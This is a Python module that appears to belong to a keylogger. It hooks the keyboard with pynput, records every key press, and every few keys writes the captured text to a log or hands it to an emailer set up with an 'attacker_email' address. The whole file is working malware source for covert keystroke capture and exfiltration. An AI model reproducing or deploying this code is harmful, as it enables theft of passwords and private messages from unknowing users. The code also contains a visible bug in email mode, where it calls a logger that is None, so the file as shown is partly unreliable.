from pynput.keyboard import Listener, Key
import os

from .logger import setlog
from .email import Emailer


class CustomListener(Listener):
    counter = 0
    count_limit = 0
    cache = ""

    def __init__(self, count_limit=5, method="log",
                 path=os.getcwd(), email="",
                 password="", attacker_email="",
                 attacker_provider="gmail.com", *args,
                 **kwargs):
        self.method = method
        self.count_limit = count_limit
        self.path = path

        if method == "log":
            self.logger = setlog(path)
            self.emailer = Emailer(method=False)
        else:
            self.logger = None
            self.emailer = Emailer(email, password,
                                   attacker_email, attacker_provider)

        self.methods = {
            "log": self.logger.info,
            "email": self.emailer.send_email
        }

        super().__init__(on_press=self.on_press, *args, **kwargs)

    def count(self):
        self.counter += 1
        if self.counter == self.count_limit:
            self.counter = 0
            return True
        return False

    def on_press(self, key: Key):
        try:
            self.cache += str(key.char)
        except AttributeError:
            k = str(key)
            if k == "Key.space":
                self.cache += " "
            else:
                self.cache += f" { k } "

        if self.count():
            self.methods[self.method](self.cache)
            self.cache = ""
